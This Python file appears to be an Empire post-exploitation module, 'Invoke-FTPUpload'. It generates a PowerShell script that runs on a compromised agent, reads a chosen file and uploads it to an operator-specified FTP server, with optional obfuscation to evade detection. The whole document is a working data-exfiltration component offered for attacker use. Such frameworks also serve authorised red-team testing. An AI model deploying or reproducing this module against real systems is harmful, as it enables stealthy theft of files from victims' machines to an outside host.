from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-FTPUpload',

            'Author': ['@infosecn1nja'],

            'Description': ('Upload a file to ftp'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'TargetFilePath' : {
                'Description'   :   'ftp://server/path/to/file',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SourceFilePath' : {
                'Description'   :   '/path/to/file',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'FTP Username',
                'Required'      :   True,
                'Value'         :   'anonymous'
            },
            'Password' : {
                'Description'   :   'FTP Password',
                'Required'      :   True,
                'Value'         :   'anonymous'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
function Invoke-FTPUpload {
Param(
    [Parameter(Mandatory=$true)]
    [string]$UserName,
    [Parameter(Mandatory=$true)]
    [string]$Password,
    [Parameter(mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$TargetFilePath    
)

$FTPRequest = [System.Net.FtpWebRequest]::Create("$TargetFilePath")
$FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$FTPRequest.Credentials = new-object System.Net.NetworkCredential($UserName, $Password)
$FTPRequest.UseBinary = $true
$FTPRequest.UsePassive = $true

$FileContent = [System.IO.File]::ReadAllBytes($SourceFilePath)
$FTPRequest.ContentLength = $FileContent.Length

$Run = $FTPRequest.GetRequestStream()
$Run.Write($FileContent, 0, $FileContent.Length)

$Run.Close()
$Run.Dispose()
}

Invoke-FTPUpload  """
        
        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
